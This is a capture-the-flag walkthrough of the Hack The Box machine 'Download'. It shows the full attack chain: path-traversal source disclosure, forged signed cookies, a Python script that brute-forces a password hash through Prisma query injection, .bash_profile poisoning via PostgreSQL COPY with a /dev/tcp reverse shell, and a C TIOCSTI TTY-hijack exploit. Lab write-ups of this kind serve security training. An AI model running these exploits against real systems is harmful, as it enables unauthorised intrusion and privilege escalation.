---
description: Quite a bit harder than Medium in my opinion.
---

# Download

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 4000 10.129.96.11  
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-07 08:56 +08
Nmap scan report for 10.129.96.11
Host is up (0.16s latency).
Not shown: 65529 closed tcp ports (conn-refused)
PORT      STATE    SERVICE
22/tcp    open     ssh
80/tcp    open     http
31114/tcp filtered unknown
31122/tcp filtered unknown
60945/tcp filtered unknown
63906/tcp filtered unknown
```

A few filtered ports and just a web service. We have to add `download.htb` to our `/etc/hosts` file to view the website.&#x20;

### Web Enum -> LFI Source Code

The website provides a file scanner service, indicating that there could be a file upload vulnerability:

<figure><img src="../../.gitbook/assets/image (4138).png" alt=""><figcaption></figcaption></figure>

Visiting the link below brings us to a file upload page:

<figure><img src="../../.gitbook/assets/image (4139).png" alt=""><figcaption></figcaption></figure>

Proxying traffic through Burp indicates that this is an Express based website. I attempted to upload a file, and got a unique UID and link:

<figure><img src="../../.gitbook/assets/image (4140).png" alt=""><figcaption></figcaption></figure>

If we click the Copy Link button, a small textbox appears in the top left with the URL followed by an alert:

<figure><img src="../../.gitbook/assets/image (4141).png" alt=""><figcaption></figcaption></figure>

I found this rather fishy because it literally creates an element in the top left. There is a file called `copy.js` which contains the code for the function, but it does not have any glaring vulnerabilities.&#x20;

I noted that there was a JWT like token present within the download, as well as a `.sig` cookie:

<figure><img src="../../.gitbook/assets/image (4142).png" alt=""><figcaption></figcaption></figure>

Here's the decoded token:

```
{"flashes":{"info":[],"error":[],"success":[]}}
```

The next thing to enumerate would be the login. I created a test user and enumerated the website some more:

&#x20;

<figure><img src="../../.gitbook/assets/image (4143).png" alt=""><figcaption></figcaption></figure>

When we create a user, the `download_session` cookie has a bit of extra information:

```
{"flashes":{"info":[],"error":[],"success":[]},"user":{"id":16,"username":"test123"}}
```

The `.sig` cookie is different too, and based on the extension of it I think it is the signature of the cookie or something. Since this was running Express, I googled for cookie related exploits pertaining to that, and found this repository:

{% embed url="https://github.com/DigitalInterruption/cookie-monster" %}

{% embed url="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/nodejs-express" %}

The similarities between the exploit found in this repository and the website were suspicious, but more enumeration could be done before going this route.&#x20;

Attempts to spoof tokens doesn't work, as they are likely being signed. The last thing I enumerated was the Download feature. It redirects us to this link:

```
http://download.htb/files/download/0623ba64-6749-48a4-9a08-a58658b74852
```

Perhaps this could be used to download other files and stuff. The uploads to this website are probably being stored within a `downloads` or `uploads` folder on the machine, so I attempted some basic LFI with some Express file names, and found that `..%2fapp.js` worked:

<figure><img src="../../.gitbook/assets/image (4144).png" alt=""><figcaption></figcaption></figure>

Here's the source code:

```javascript
"use strict";
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
const express_1 = __importDefault(require("express"));
const nunjucks_1 = __importDefault(require("nunjucks"));
const path_1 = __importDefault(require("path"));
const cookie_parser_1 = __importDefault(require("cookie-parser"));
const cookie_session_1 = __importDefault(require("cookie-session"));
const flash_1 = __importDefault(require("./middleware/flash"));
const auth_1 = __importDefault(require("./routers/auth"));
const files_1 = __importDefault(require("./routers/files"));
const home_1 = __importDefault(require("./routers/home"));
const client_1 = require("@prisma/client");
const app = (0, express_1.default)();
const port = 3000;
const client = new client_1.PrismaClient();
const env = nunjucks_1.default.configure(path_1.default.join(__dirname, "views"), {
    autoescape: true,
    express: app,
    noCache: true,
});
app.use((0, cookie_session_1.default)({
    name: "download_session",
    keys: ["8929874489719802418902487651347865819634518936754"],
    maxAge: 7 * 24 * 60 * 60 * 1000,
}));
app.use(flash_1.default);
app.use(express_1.default.urlencoded({ extended: false }));
app.use((0, cookie_parser_1.default)());
app.use("/static", express_1.default.static(path_1.default.join(__dirname, "static")));
app.get("/", (req, res) => {
    res.render("index.njk");
});
app.use("/files", files_1.default);
app.use("/auth", auth_1.default);
app.use("/home", home_1.default);
app.use("*", (req, res) => {
    res.render("error.njk", { statusCode: 404 });
});
app.listen(port, process.env.NODE_ENV === "production" ? "127.0.0.1" : "0.0.0.0", () => {
    console.log("Listening on ", port);
    if (process.env.NODE_ENV === "production") {
        setTimeout(async () => {
            await client.$executeRawUnsafe(`COPY (SELECT "User".username, sum("File".size) FROM "User" INNER JOIN "File" ON "File"."authorId" = "User"."id" GROUP BY "User".username) TO '/var/backups/fileusages.csv' WITH (FORMAT csv);`);
        }, 300000);
    }
});
```

The thing that jumps out the most is the SQL query, which dumps the output to a `.csv` file. Additionally, the key for the token signing is present. There are a lot of other folders being imported, such as `..%2frouters%2fhome.js`. Visiting `files.js` shows us why the LFI exists:

```javascript
router.get("/download/:fileId", async (req, res) => {
    const fileEntry = await client.file.findFirst({
        where: { id: req.params.fileId },
        select: {
            name: true,
            private: true,
            authorId: true,
        },
    });
    if (fileEntry?.private && req.session?.user?.id !== fileEntry.authorId) {
        return res.status(404);
    }
    return res.download(path_1.default.join(uploadPath, req.params.fileId), fileEntry?.name ?? "Unknown");
}
```

The `id` parameter is not being sanitised at all. I managed to find `package.json` as part of the folders too:

```json
{
  "name": "download.htb",
  "version": "1.0.0",
  "description": "",
  "main": "app.js",
  "scripts": {
    "test": "echo \"Error: no test specified\" && exit 1",
    "dev": "nodemon --exec ts-node --files ./src/app.ts",
    "build": "tsc"
  },
  "keywords": [],
  "author": "wesley",
  "license": "ISC",
  "dependencies": {
    "@prisma/client": "^4.13.0",
    "cookie-parser": "^1.4.6",
    "cookie-session": "^2.0.0",
    "express": "^4.18.2",
    "express-fileupload": "^1.4.0",
    "zod": "^3.21.4"
  },
  "devDependencies": {
    "@types/cookie-parser": "^1.4.3",
    "@types/cookie-session": "^2.0.44",
    "@types/express": "^4.17.17",
    "@types/express-fileupload": "^1.4.1",
    "@types/node": "^18.15.12",
    "@types/nunjucks": "^3.2.2",
    "nodemon": "^2.0.22",
    "nunjucks": "^3.2.4",
    "prisma": "^4.13.0",
    "ts-node": "^10.9.1",
    "typescript": "^5.0.4"
  }
}
```

From this, I learned that the user is named `wesley`. I also took a look at `routers/auth.js` to see how the cookie is being used:

```javascript
"use strict";
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
const client_1 = require("@prisma/client");
const express_1 = __importDefault(require("express"));
const zod_1 = __importDefault(require("zod"));
const node_crypto_1 = __importDefault(require("node:crypto"));
const router = express_1.default.Router();
const client = new client_1.PrismaClient();
const hashPassword = (password) => {
    return node_crypto_1.default.createHash("md5").update(password).digest("hex");
};
const LoginValidator = zod_1.default.object({
    username: zod_1.default.string().min(6).max(64),
    password: zod_1.default.string().min(6).max(64),
});
router.get("/login", (req, res) => {
    res.render("login.njk");
});
router.post("/login", async (req, res) => {
    const result = LoginValidator.safeParse(req.body);
    if (!result.success) {
        res.flash("error", "Your login details were invalid, please try again.");
        return res.redirect("/auth/login");
    }
    const data = result.data;
    const user = await client.user.findFirst({
        where: { username: data.username, password: hashPassword(data.password) },
    });
    if (!user) {
        res.flash("error", "That username / password combination did not exist.");
        return res.redirect("/auth/register");
    }
    req.session.user = {
        id: user.id,
        username: user.username,
    };
    res.flash("success", "You are now logged in.");
    return res.redirect("/home/");
});
router.get("/register", (req, res) => {
    res.render("register.njk");
});
const RegisterValidator = zod_1.default.object({
    username: zod_1.default.string().min(6).max(64),
    password: zod_1.default.string().min(6).max(64),
});
router.post("/register", async (req, res) => {
    const result = RegisterValidator.safeParse(req.body);
    if (!result.success) {
        res.flash("error", "Your registration details were invalid, please try again.");
        return res.redirect("/auth/register");
    }
    const data = result.data;
    const existingUser = await client.user.findFirst({
        where: { username: data.username },
    });
    if (existingUser) {
        res.flash("error", "There is already a user with that email address or username.");
        return res.redirect("/auth/register");
    }
    await client.user.create({
        data: {
            username: data.username,
            password: hashPassword(data.password),
        },
    });
    res.flash("success", "Your account has been registered.");
    return res.redirect("/auth/login");
});
router.get("/logout", (req, res) => {
    if (req.session)
        req.session.user = null;
    res.flash("success", "You have been successfully logged out.");
    return res.redirect("/auth/login");
});
exports.default = router;
```

A user's password is hashed and unsalted, then used for authentication purposes. Since this was Express, and the token is not being validated in anyway, I thought of trying some injection.

`auth.js` uses this bit of code to check a username and password:

```javascript
router.post("/login", async (req, res) => {
    const result = LoginValidator.safeParse(req.body);
    if (!result.success) {
        res.flash("error", "Your login details were invalid, please try again.");
        return res.redirect("/auth/login");
    }
    const data = result.data;
    const user = await client.user.findFirst({
        where: { username: data.username, password: hashPassword(data.password) },
    });
    if (!user) {
        res.flash("error", "That username / password combination did not exist.");
        return res.redirect("/auth/register");
    }
    req.session.user = {
        id: user.id,
        username: user.username,
    };
    res.flash("success", "You are now logged in.");
    return res.redirect("/home/");
});
```

This checks for the `username` and hashed `password` parameter within a cookie. Interestingly, it checks whether the `user`parameter is true, and then redirects the respective page instead of checking the parameters.

`findFirst` just checks whether the query matches our criteria:

{% embed url="https://www.prisma.io/docs/reference/api-reference/prisma-client-reference#findfirst" %}

### Blind Injection -> Cookie Monster Brute Force

Here are the facts so far and my deductions:

* `.sig` , the key I found and how the token is structured -> Definitely need to use Cookie Monster somehow.
* User is `wesley`, and hashes are unsalted and used directly for authentication -> Brute force is theoretically possible if done smartly.
* There's a SQL query that is 100% injectable, but I don't know how to exploit it at this point.
* The cookie is not validated in any way, it takes my input directly. It checks whether a `true` condition is returned from `findFirst` from the `prisma` API module -> Blind Injection based on where it redirects us?&#x20;

Based on the facts above, there should be a method of which we can brute force the hash using a smartly created user cookie that is signed through Cookie Monster.&#x20;

Since this uses `prisma` client API, we can try to inject some commands from that module based on their nested JSON queries possible.

{% embed url="https://www.prisma.io/docs/concepts/components/prisma-client/working-with-fields/working-with-json-fields#advanced-example-update-a-nested-json-key-value" %}

&#x20;I tried to use `contains` first in this cookie:

```
{"user":{"username":{"contains": "WESLEY"}, "password":{"startsWith":"a"}}}
```

Then, I signed the cookie required:

```
$ ./cookie-monster.js -e -f ../cookie.json -k 8929874489719802418902487651347865819634518936754 -n download_session
               _  _
             _/0\/ \_
    .-.   .-` \_/\0/ '-.
   /:::\ / ,_________,  \
  /\:::/ \  '. (:::/  `'-;
  \ `-'`\ '._ `"'"'\__    \
   `'-.  \   `)-=-=(  `,   |
       \  `-"`      `"-`   /

[+] Data Cookie: download_session=eyJ1c2VyIjp7InVzZXJuYW1lIjp7ImNvbnRhaW5zIjoiV0VTTEVZIn19fQ==                                                                                            
[+] Signature Cookie: download_session.sig=v0PDQv1xMVxi-N8hRUHd2B___z4
```

Using these parameters on the website returned the `/home` directory with response that looks like it works:

<figure><img src="../../.gitbook/assets/image (4145).png" alt=""><figcaption></figcaption></figure>

I tried each character until I reached `f`, and it returned something different:

<figure><img src="../../.gitbook/assets/image (4146).png" alt=""><figcaption></figcaption></figure>

The length of the first response was `2174`, while the second was different. Based on this, we should have exploited blind injection successfully and automation is possible. Further testing with 2 characters works as well.

Here's my script:

```python
import string
import requests
import json
import requests
import subprocess

password = ''
chars = "abcdef0123456789" # Hashes only have these characters
test = '' 

def generate(c):
	query = {"user":{"username":{"contains": "WESLEY"}, "password":{"startsWith":c}}}
	with open("cookie.json","w") as f:
		f.write(json.dumps(query))
	output = subprocess.check_output(["./cookie-monster.js", "-e", "-f", "cookie.json", "-k", "8929874489719802418902487651347865819634518936754", "-n", "download_session"]).decode().replace("\n"," ")

	jwt = output.split("download_session=")[1]
	jwt = jwt.split(" ")[0]
	jwt = jwt.split("\x1b")[0]
	sig = output.split("download_session.sig=")[1]
	sig = sig.split("\x1b")[0]
	return jwt,sig

for i in range(32):
	for c in chars:
		test = password + c
		jwt, sig = generate(test)
		cookie = {"download_session": jwt, "download_session.sig": sig}
		r = requests.get('http://download.htb/home/', cookies=cookie)
		if len(r.text) != 2174:
			print(f"Found char: {c}")
			password += c
			print(password)
			break

print(password)
```

This would slowly print out a hash value:

<figure><img src="../../.gitbook/assets/image (4147).png" alt=""><figcaption></figcaption></figure>

When we get the full hash, we can take it to CrackStation to crack it and then use that same password to `ssh` in as `wesley`!

<figure><img src="../../.gitbook/assets/image (4148).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### LinPEAS + Pspy64 -> Postgres Creds

`linpeas.sh` picked up on a few things:

```
[+] Active Ports
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-ports                 
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:5432          0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -


[+] Users with console
postgres:x:113:118:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash               
root:x:0:0:root:/root:/bin/bash
wesley:x:1000:1000:wesley:/home/wesley:/bin/bash

[+] Searching root files in home dirs (limit 30)
/home/                                                                                     
/home/wesley/.bash_history
/home/wesley/user.txt
/home/wesley/.psql_history
/root/

[+] Files inside others home (limit 20)
/var/lib/postgresql/.bash_history                                                          
/var/lib/postgresql/.psql_history
```

It's quite clear that we have to somehow escalate privileges to the `postgres` user since it has a console and PostgreSQL is open on the machine. I ran a `pspy64` scan to see commands executed by the `postgres` and `root` users too:

```
2023/08/07 03:13:16 CMD: UID=113  PID=57201  | /usr/bin/perl /usr/bin/psql 
2023/08/07 03:13:16 CMD: UID=113  PID=57202  | /bin/bash /usr/bin/ldd /usr/lib/postgresql/12/bin/psql                                                                                 
2023/08/07 03:13:16 CMD: UID=113  PID=57209  | postgres: 12/main: postgres postgres [local] idle 
2023/08/07 03:13:12 CMD: UID=113  PID=57195  | -bash 
2023/08/07 03:13:12 CMD: UID=0    PID=57194  | su -l postgres 
2023/08/07 03:13:12 CMD: UID=0    PID=57185  | /bin/bash -i ./manage-db 
2023/08/07 03:13:12 CMD: UID=0    PID=57173  | -bash 
2023/08/07 03:13:12 CMD: UID=0    PID=57106  | /lib/systemd/systemd-udevd 
2023/08/07 03:13:12 CMD: UID=0    PID=57105  | /lib/systemd/systemd-udevd 
2023/08/07 03:13:12 CMD: UID=0    PID=57102  | /lib/systemd/systemd-udevd 
2023/08/07 03:13:12 CMD: UID=0    PID=57101  | /lib/systemd/systemd-udevd 
2023/08/07 03:13:12 CMD: UID=0    PID=57100  | /lib/systemd/systemd-udevd 
2023/08/07 03:13:12 CMD: UID=0    PID=57099  | /lib/systemd/systemd-udevd 
2023/08/07 03:13:12 CMD: UID=0    PID=57098  | /lib/systemd/systemd-udevd 
2023/08/07 03:13:12 CMD: UID=0    PID=57097  | /lib/systemd/systemd-udevd 
2023/08/07 03:13:12 CMD: UID=0    PID=57096  | /lib/systemd/systemd-udevd 
2023/08/07 03:13:12 CMD: UID=0    PID=57095  | /lib/systemd/systemd-udevd 
2023/08/07 03:13:12 CMD: UID=0    PID=57094  | /lib/systemd/systemd-udevd 
2023/08/07 03:13:12 CMD: UID=0    PID=57093  | /lib/systemd/systemd-udevd 
2023/08/07 03:13:12 CMD: UID=0    PID=57091  | /lib/systemd/systemd-udevd
```

There were also a lot of services being run by `root`.&#x20;

```
ls /etc/systemd/system
cloud-init.target.wants                     multi-user.target.wants                        
dbus-org.freedesktop.ModemManager1.service  network-online.target.wants                    
dbus-org.freedesktop.resolve1.service       open-vm-tools.service.requires                 
dbus-org.freedesktop.thermald.service       paths.target.wants
dbus-org.freedesktop.timesync1.service      rescue.target.wants
default.target.wants                        sleep.target.wants
download-site.service                       sockets.target.wants
emergency.target.wants                      sshd-keygen@.service.d
getty.target.wants                          sshd.service
graphical.target.wants                      sysinit.target.wants
iscsi.service                               syslog.service
management.service                          timers.target.wants
mdmonitor.service.wants                     vmtoolsd.service
multipath-tools.service
```

I checked for passwords, and found one within `download-site.service`.&#x20;

```
wesley@download:/tmp$ cat /etc/systemd/system/download-site.service
[Unit]
Description=Download.HTB Web Application
After=network.target

[Service]
Type=simple
User=www-data
WorkingDirectory=/var/www/app/
ExecStart=/usr/bin/node app.js
Restart=on-failure
Environment=NODE_ENV=production
Environment=DATABASE_URL="postgresql://download:<redacted>@localhost:5432/download"

[Install]
WantedBy=multi-user.target
```

With this, we can login to the PostgreSQL server via `psql`.&#x20;

<figure><img src="../../.gitbook/assets/image (4149).png" alt=""><figcaption></figcaption></figure>

### PostGreSQL Privileges -> Postgres Shell

We can first enumerate the privileges we have with `\du`:

```
 Role name |                         Attributes                         |        Member of        
-----------+------------------------------------------------------------+-------------------------
 download  |                                                            | {pg_write_server_files}
 postgres  | Superuser, Create role, Create DB, Replication, Bypass RLS | {}
```

Interestingly, we are given the `pg_write_server_files` privilege. The database itself does not have any interesting information, so we are supposed to use this privilege to escalate to `postgres`.&#x20;

Since we have an arbitrary write as this user, I thought of creating a `/bin/bash` SUID binary to escalate to it. Being able to write files as the `postgres` user is no good if we cannot execute it as `postgres`.&#x20;

I noticed that `root` runs `su -l postgres`, meaning that that user is being logged into periodically. This means that files like `.bashrc` and `.profile` are being executed when this command is executed. Using our file write abilities, we can write in some commands to the `.bash_profile` file, which would be executed when `root` logs in as `postgres`.&#x20;

I used this to spawn an SUID shell:

```sql
COPY (SELECT CAST ('cp /bin/bash /tmp/sql_shell;chmod 4777 /tmp/sql_shell;'AS text)) TO '/var/lib/postgresql/.bash_profile';
```

After waiting for a bit, we can move laterally:

<figure><img src="../../.gitbook/assets/image (4150).png" alt=""><figcaption></figcaption></figure>

However, we are still technically `wesley`instead of `postgres` even if the EUID changes. We can replace the command executed with a reverse shell instead:

```sql
COPY (SELECT CAST('bash -i >& /dev/tcp/10.10.14.7/4444 0>&1' AS text)) TO '/var/lib/postgresql/.bash_profile';
```

Then on a listener port, we would get a `postgres` shell:

<figure><img src="../../.gitbook/assets/image (4151).png" alt=""><figcaption></figcaption></figure>

However, the shell dies quickly, presumably because the connection cuts out when `root` runs `su -l` again. At least I know that this works.&#x20;

### TTY Hijack -> Root

I found it rather odd that `su -l` was used instead of a regular `su`. Using `w`, we know that `root` is logged in and has a TTY shell of its own.

```
wesley@download:/tmp$ w                                                                      
 04:47:53 up  8:33,  3 users,  load average: 0.33, 0.37, 0.35                                
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT                          
wesley   pts/0    10.10.14.7       03:02    0.00s  0.34s  0.01s w
root     pts/1    127.0.0.1        04:47   13.00s  0.08s  0.04s /usr/lib/postgresql/12/bin/p
```

I was thinking whether there were ways to hijack this session. Searching for `root su hijack` shows me this article:

{% embed url="https://ruderich.org/simon/notes/su-sudo-from-root-tty-hijacking" %}

The website above included a PoC in C. I changed the command executed first to test it:

```c
#include <fcntl.h>
#include <stdio.h>
#include <string.h>
#include <sys/ioctl.h>
int main() {
    int fd = open("/dev/tty", O_RDWR);
    if (fd < 0) {
        perror("open");
        return -1;
    }
    char *x = "exit\n/bin/bash -c 'cp /root/root.txt /tmp/root.txt'\n";
    while (*x != 0) {
        int ret = ioctl(fd, TIOCSTI, x);
        if (ret == -1) {
            perror("ioctl()");
        }
        x++;
    }
    return 0;
}
```

Then, I compiled it using `gcc` and transferred to the machine and then ran `chmod` on it. Afterwards, I ran the same SQL command to execute this compiled exploit as `root`:

```sql
COPY (SELECT CAST('/tmp/exploit' AS text)) TO '/var/lib/postgresql/.bash_profile';
```

After waiting for a bit, the `root` flag appeared within the `/tmp` directory, confirming that it works:

<figure><img src="../../.gitbook/assets/image (4153).png" alt=""><figcaption></figcaption></figure>

Using this, we can create another one to get a reverse shell as `root` or run `chmod u+s /bin/bash`.&#x20;

<figure><img src="../../.gitbook/assets/image (4154).png" alt=""><figcaption></figcaption></figure>

Rooted!